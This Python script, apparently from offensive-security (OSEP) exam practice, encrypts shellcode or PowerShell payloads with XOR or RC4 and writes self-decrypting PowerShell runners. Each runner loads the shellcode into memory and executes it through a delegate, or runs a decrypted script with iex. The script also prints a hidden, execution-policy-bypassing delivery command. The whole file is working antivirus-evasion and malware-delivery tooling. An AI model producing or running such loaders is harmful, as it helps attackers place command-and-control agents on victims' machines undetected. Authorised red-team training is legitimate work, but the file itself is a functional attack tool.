#!/usr/bin/env python3
"""
OSEP - Simple payload encryptor (XOR / RC4).
Outputs a self-decrypting PowerShell runner stub.

Usage:
  # Raw shellcode (e.g. Adaptix agent .bin):
  python3 av_evasion.py xor 0x41 agent.bin runner.ps1
  python3 av_evasion.py rc4 "SecretKey" agent.bin runner.ps1

  # PowerShell script:
  python3 av_evasion.py rc4 "SecretKey" payload.ps1 runner.ps1 --ps1
"""

import sys, base64

def xor_enc(data, key):
    return bytes(b ^ key for b in data)

def rc4_enc(data, key):
    k = key.encode(); S = list(range(256)); j = 0
    for i in range(256):
        j = (j + S[i] + k[i % len(k)]) % 256
        S[i], S[j] = S[j], S[i]
    i = j = 0; out = []
    for b in data:
        i = (i+1)%256; j=(j+S[i])%256; S[i],S[j]=S[j],S[i]
        out.append(b ^ S[(S[i]+S[j])%256])
    return bytes(out)

def fmt(data):
    return ','.join(f'0x{b:02X}' for b in data)

XOR_STUB = """
$enc=[byte[]]({bytes})
$sc =for($i=0;$i -lt $enc.Length;$i++){{$enc[$i] -bxor 0x{key:02X}}}
$a=[Runtime.InteropServices.Marshal]::AllocHGlobal($sc.Count)
[Runtime.InteropServices.Marshal]::Copy([byte[]]$sc,0,$a,$sc.Count)
$t=[System.Threading.Thread]::new([System.Threading.ThreadStart]::new({{
    $d=[Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($a,[Action])
    $d.Invoke()
}}))
$t.Start(); $t.Join()
"""

RC4_SC_STUB = """
function _rc4($d,$k){{
    $kb=[Text.Encoding]::ASCII.GetBytes($k);$S=0..255;$j=0
    for($i=0;$i-lt 256;$i++){{$j=($j+$S[$i]+$kb[$i%$kb.Length])%256;$S[$i],$S[$j]=$S[$j],$S[$i]}}
    $i=$j=0;$o=[byte[]]::new($d.Length)
    for($n=0;$n-lt $d.Length;$n++){{$i=($i+1)%256;$j=($j+$S[$i])%256;$S[$i],$S[$j]=$S[$j],$S[$i];$o[$n]=$d[$n]-bxor $S[($S[$i]+$S[$j])%256]}}
    $o
}}
$enc=[byte[]]({bytes})
$sc=_rc4 $enc "{key}"
$a=[Runtime.InteropServices.Marshal]::AllocHGlobal($sc.Count)
[Runtime.InteropServices.Marshal]::Copy([byte[]]$sc,0,$a,$sc.Count)
$t=[System.Threading.Thread]::new([System.Threading.ThreadStart]::new({{
    $d=[Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($a,[Action])
    $d.Invoke()
}}))
$t.Start(); $t.Join()
"""

RC4_PS1_STUB = """
function _rc4($d,$k){{
    $kb=[Text.Encoding]::ASCII.GetBytes($k);$S=0..255;$j=0
    for($i=0;$i-lt 256;$i++){{$j=($j+$S[$i]+$kb[$i%$kb.Length])%256;$S[$i],$S[$j]=$S[$j],$S[$i]}}
    $i=$j=0;$o=[byte[]]::new($d.Length)
    for($n=0;$n-lt $d.Length;$n++){{$i=($i+1)%256;$j=($j+$S[$i])%256;$S[$i],$S[$j]=$S[$j],$S[$i];$o[$n]=$d[$n]-bxor $S[($S[$i]+$S[$j])%256]}}
    $o
}}
$enc=[byte[]]({bytes})
iex ([Text.Encoding]::Unicode.GetString((_rc4 $enc "{key}")))
"""

def main():
    if len(sys.argv) < 5:
        print(__doc__); sys.exit(1)
    method, key_arg, infile, outfile = sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4]
    ps1_mode = '--ps1' in sys.argv

    raw = open(infile, 'rb').read()
    print(f"[*] Input: {len(raw)} bytes")

    if method == 'xor':
        key = int(key_arg, 0)
        enc = xor_enc(raw, key)
        stub = XOR_STUB.format(bytes=fmt(enc), key=key)
    elif method == 'rc4':
        if ps1_mode:
            enc = rc4_enc(raw.decode().encode('utf-16-le'), key_arg)
            stub = RC4_PS1_STUB.format(bytes=fmt(enc), key=key_arg)
        else:
            enc = rc4_enc(raw, key_arg)
            stub = RC4_SC_STUB.format(bytes=fmt(enc), key=key_arg)
    else:
        print(f"Unknown method: {method}"); sys.exit(1)

    open(outfile, 'w').write(stub.strip())
    print(f"[+] Written: {outfile}")
    print(f"[*] Deliver: powershell -nop -ep bypass -w hidden -f {outfile}")

main()
